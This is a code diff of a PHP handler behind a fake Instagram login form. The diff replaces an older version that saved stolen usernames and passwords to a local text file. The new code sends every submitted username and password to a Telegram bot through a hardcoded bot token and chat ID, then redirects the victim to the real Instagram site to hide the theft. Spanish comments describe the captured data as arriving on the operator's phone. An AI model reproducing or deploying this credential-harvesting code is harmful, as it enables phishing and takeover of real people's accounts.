@@ -1,21 +1,22 @@
 <?php
-// Solo ejecuta esto si los datos realmente fueron enviados por el formulario (POST)
-if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    
-    // Validamos que existan los datos para que no tire warning
-    $username = isset($_POST['username']) ? $_POST['username'] : '';
-    $password = isset($_POST['password']) ? $_POST['password'] : '';
+// Configuración de Telegram
+$token = "8761245881:AAEzL6BhOe0K2zi9tov80NXR0v9XcpsYRcU";
+$chat_id = "5773870334"; // Reemplazá esto por tu ID de userinfobot
 
-    if (!empty($username) || !empty($password)) {
-        file_put_contents("usernames.txt", "Instagram Username: " . $username . " . Pass: " . $password . "\n", FILE_APPEND);
-    }
+// Captura los datos del formulario de Instagram
+$username = $_POST['username'];
+$password = $_POST['password'];
 
-    $url = "https://instagram.com";
-    header("Location: $url");
-    exit();
-} else {
-    // Si entran directo sin pasar por el formulario, los mandamos a tu diseño visual
-    header("Location: login.html.php");
-    exit();
-}
+// Arma el mensaje que te va a llegar al celular
+$message = "📩 ¡Nuevo Registro de Instagram!\n\n";
+$message .= "👤 Usuario: " . $username . "\n";
+$message .= "🔑 Contraseña: " . $password . "\n";
+
+// Envía los datos a Telegram usando la API
+$url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chat_id . "&text=" . urlencode($message);
+file_get_contents($url);
+
+// Redirige al usuario a la página oficial de Instagram
+header("Location: https://instagram.com");
+exit();
 ?>
